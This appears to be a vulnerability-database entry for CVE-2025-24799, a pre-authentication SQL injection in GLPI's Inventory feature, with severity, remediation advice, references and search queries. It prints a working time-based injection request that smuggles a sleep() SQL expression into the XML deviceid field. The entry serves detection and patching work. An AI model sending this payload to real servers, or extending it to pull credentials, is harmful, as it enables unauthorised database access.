---
layout: post
cve_id: CVE-2025-24799
title: GLPI < 10.0.17 - Pre-Auth SQL Injection
pcap: true
pcap_path: /pcaps/2025/CVE-2025-24799.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-24799.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary SQL queries through XML requests
  to the Inventory feature, potentially extracting user credentials, bypassing authentication,
  and accessing sensitive database information.

  '
remediation: 'Upgrade to GLPI version 10.0.18 or later. If upgrading is not immediately
  possible, consider disabling the Inventory feature or restricting access to it.

  '
reference:
- https://blog.lexfo.fr/glpi-sql-to-rce.html
- https://github.com/glpi-project/glpi/security/advisories/GHSA-p626-hph9-p6fj
- https://nvd.nist.gov/vuln/detail/CVE-2025-24799
classification:
  epss-score: 0.63756
  epss-percentile: 0.98351
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2025-24799
  cwe-id: CWE-89
metadata:
  verified: true
  product: GLPI
  max-request: 1
  shodan-query: title:"GLPI"
  fofa-query: title="GLPI"
tags:
- cve
- cve2025
- glpi
- sqli
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A pre-authentication SQL injection vulnerability exists in the Inventory feature of GLPI. The vulnerability is caused by insufficient sanitization of user input in the handleAgent function when processing XML requests. The issue occurs because SimpleXMLElement objects can bypass the dbEscapeRecursive function, allowing an attacker to inject SQL queries. This can lead to unauthorized access to sensitive information in the database, including user credentials and potential authentication bypass.


## ðŸŒ HTTP Request
```nohighlight
POST /index.php/ajax/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Connection: close
Content-Length: 233
Content-Type: application/xml
Accept-Encoding: gzip
<?xml version="1.0" encoding="UTF-8"?>
<xml>
<QUERY>get_params</QUERY>
<deviceid>', IF((1=1),(select sleep(7)),1), 0, 0, 0, 0, 0, 0);#</deviceid>
<content>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</content>
</xml>
```

